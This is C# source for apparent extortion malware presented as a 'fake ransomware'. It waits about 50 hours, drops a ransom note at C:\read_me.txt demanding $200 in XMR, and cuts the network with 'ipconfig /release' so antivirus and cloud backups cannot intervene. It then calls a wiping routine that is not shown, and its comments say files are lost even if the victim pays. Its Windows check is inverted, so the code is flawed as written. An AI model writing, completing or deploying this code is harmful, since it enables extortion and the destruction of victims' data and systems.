using System;
using System.IO;
using System.Runtime.InteropServices;

namespace Main
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) //currently does not work on Linux.
            {
                Environment.Exit(0);
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX)) //currently does not work on OSX.
            {
                Environment.Exit(0);
            }
            else if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) //if windows is found. engage
            {
                System.Threading.Thread.Sleep(180000000); //waits 50 hours before executing main class. optional.
                FileStream fs = new FileStream(@"C:\read_me.txt", FileMode.OpenOrCreate, FileAccess.Write); //small note that will act as a fake ransomware note. asking for money. no payment = files gone. it will happen anyway even if they pay or not.
                StreamWriter sw = new StreamWriter(fs);
                sw.BaseStream.Seek(0, SeekOrigin.End);
                sw.WriteLine("Hello! It looks like your system has been comprimised!");
                sw.WriteLine("Please send $200 XMR to this address ADDRESS_HERE or your system will be wiped!");
                sw.WriteLine("You have 16 mins to comply!");
                sw.Flush();
                sw.Close();

                System.Threading.Thread.Sleep(1000000); // waits 16 mins before executing (you can change to any time you want. time is in ms.)
                System.Diagnostics.Process.Start("ipconfig", "/release"); //disable internet connectivity. prevents any huristic AVs from removing anything done. also prevents cloud backups and one-drive syncs.
                Endurance.Start();
            }
        }
    }
}
